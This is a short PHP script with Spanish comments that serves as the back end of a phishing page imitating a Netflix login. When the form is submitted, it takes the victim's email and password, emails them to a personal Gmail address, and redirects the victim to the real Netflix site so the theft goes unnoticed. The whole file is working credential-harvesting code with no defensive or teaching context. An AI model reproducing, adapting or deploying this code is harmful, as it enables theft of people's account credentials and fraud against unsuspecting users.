<?php
// Verificar si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];



    // Destinatario
    $to = 'yeriselpe@gmail.com';
    
    // Asunto del correo
    $subject = 'Nuevo inicio de sesión en Netflix';

    // Cuerpo del correo
    $message = "Se ha intentado un inicio de sesión en Netflix con los siguientes datos:\n\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";
    
    // Encabezados del correo
    $headers = "From: no-reply@tusitio.com" . "\r\n" .
               "Reply-To: no-reply@tusitio.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redirigir a la página de Netflix después de un login exitoso
        header('Location: https://www.netflix.com/browse');
        exit;  // Termina la ejecución del script después de la redirección
    } else {
        
    }
}
?>
